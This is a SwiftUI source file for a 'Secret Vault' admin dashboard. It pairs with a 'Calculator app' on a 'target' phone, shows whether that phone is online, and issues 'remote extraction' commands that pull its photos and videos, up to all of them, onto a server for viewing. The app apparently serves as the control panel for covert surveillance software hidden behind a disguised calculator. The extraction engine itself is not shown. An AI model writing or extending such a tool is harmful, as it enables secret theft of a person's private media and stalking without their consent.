import SwiftUI

struct AdminDashboardView: View {
    @StateObject private var admin = AdminEngine.shared
    @State private var pairingInput = ""
    @State private var isPaired = false
    @State private var selectedType = "photos"
    @State private var selectedCount = 10
    @State private var selectedItem: VaultMediaItem?

    var body: some View {
        NavigationView {
            ZStack {
                Color(red: 0.05, green: 0.06, blue: 0.08).edgesIgnoringSafeArea(.all)

                if !isPaired {
                    // Pair Screen
                    VStack(spacing: 24) {
                        Image(systemName: "shield.lefthalf.filled")
                            .font(.system(size: 64))
                            .foregroundColor(.green)
                            .padding(.top, 40)

                        Text("SECRET VAULT ADMIN")
                            .font(.title2)
                            .fontWeight(.bold)
                            .foregroundColor(.white)

                        Text("Enter the Pairing Code shown inside Phone A's Calculator app")
                            .font(.caption)
                            .foregroundColor(.gray)
                            .multilineTextAlignment(.center)
                            .padding(.horizontal, 32)

                        TextField("e.g. VAULT-7860", text: $pairingInput)
                            .font(.system(size: 20, weight: .bold, design: .monospaced))
                            .multilineTextAlignment(.center)
                            .padding()
                            .background(Color.white.opacity(0.08))
                            .cornerRadius(12)
                            .foregroundColor(.green)
                            .padding(.horizontal, 40)

                        Button(action: {
                            admin.connect(code: pairingInput)
                            isPaired = true
                        }) {
                            Text("CONNECT TO PHONE A")
                                .font(.headline)
                                .fontWeight(.bold)
                                .foregroundColor(.black)
                                .frame(maxWidth: .infinity)
                                .padding()
                                .background(Color.green)
                                .cornerRadius(12)
                                .padding(.horizontal, 40)
                        }

                        Spacer()
                    }
                } else {
                    // Dashboard Screen
                    ScrollView {
                        VStack(spacing: 20) {
                            // Target Status Bar
                            HStack {
                                Circle()
                                    .fill(admin.isTargetOnline ? Color.green : Color.red)
                                    .frame(width: 10, height: 10)
                                Text(admin.isTargetOnline ? "PHONE A ONLINE" : "PHONE A OFFLINE")
                                    .font(.caption)
                                    .fontWeight(.bold)
                                    .foregroundColor(admin.isTargetOnline ? .green : .red)
                                Spacer()
                                Text("PAIR: \(admin.pairingCode)")
                                    .font(.system(.caption, design: .monospaced))
                                    .foregroundColor(.gray)
                            }
                            .padding()
                            .background(Color.white.opacity(0.05))
                            .cornerRadius(14)

                            // Command Trigger Card
                            VStack(alignment: .leading, spacing: 14) {
                                Text("REMOTE EXTRACTION COMMAND")
                                    .font(.caption)
                                    .fontWeight(.bold)
                                    .foregroundColor(.gray)

                                // Type Picker
                                Picker("Type", selection: $selectedType) {
                                    Text("Photos").tag("photos")
                                    Text("Videos").tag("videos")
                                    Text("Both").tag("all")
                                }
                                .pickerStyle(SegmentedPickerStyle())

                                // Count Selection
                                HStack {
                                    Text("Amount:")
                                        .font(.subheadline)
                                        .foregroundColor(.white)
                                    Spacer()
                                    Picker("Count", selection: $selectedCount) {
                                        Text("5").tag(5)
                                        Text("10").tag(10)
                                        Text("25").tag(25)
                                        Text("50").tag(50)
                                        Text("All").tag(-1)
                                    }
                                    .pickerStyle(MenuPickerStyle())
                                }

                                Button(action: {
                                    admin.sendSyncCommand(type: selectedType, count: selectedCount)
                                }) {
                                    HStack {
                                        Image(systemName: "arrow.down.circle.fill")
                                        Text("FETCH & STORE IN THIS VAULT")
                                            .fontWeight(.bold)
                                    }
                                    .foregroundColor(.black)
                                    .frame(maxWidth: .infinity)
                                    .padding()
                                    .background(Color.green)
                                    .cornerRadius(12)
                                }
                            }
                            .padding()
                            .background(Color.white.opacity(0.06))
                            .cornerRadius(16)

                            // Vault Media Grid
                            VStack(alignment: .leading, spacing: 12) {
                                HStack {
                                    Text("STORED VAULT MEDIA (\(admin.vaultItems.count))")
                                        .font(.caption)
                                        .fontWeight(.bold)
                                        .foregroundColor(.gray)
                                    Spacer()
                                    Button(action: { admin.fetchVaultMedia() }) {
                                        Image(systemName: "arrow.clockwise")
                                            .foregroundColor(.green)
                                    }
                                }

                                LazyVGrid(columns: [GridItem(.adaptive(minimum: 100), spacing: 8)], spacing: 8) {
                                    ForEach(admin.vaultItems) { item in
                                        AsyncImage(url: URL(string: "\(admin.serverURL)\(item.url)")) { phase in
                                            if let image = phase.image {
                                                image
                                                    .resizable()
                                                    .scaledToFill()
                                                    .frame(width: 100, height: 100)
                                                    .clipped()
                                                    .cornerRadius(8)
                                            } else {
                                                Color.gray.opacity(0.2)
                                                    .frame(width: 100, height: 100)
                                                    .cornerRadius(8)
                                            }
                                        }
                                        .onTapGesture {
                                            selectedItem = item
                                        }
                                    }
                                }
                            }
                        }
                        .padding()
                    }
                }
            }
            .navigationTitle("Secret Vault")
            .navigationBarHidden(true)
        }
    }
}
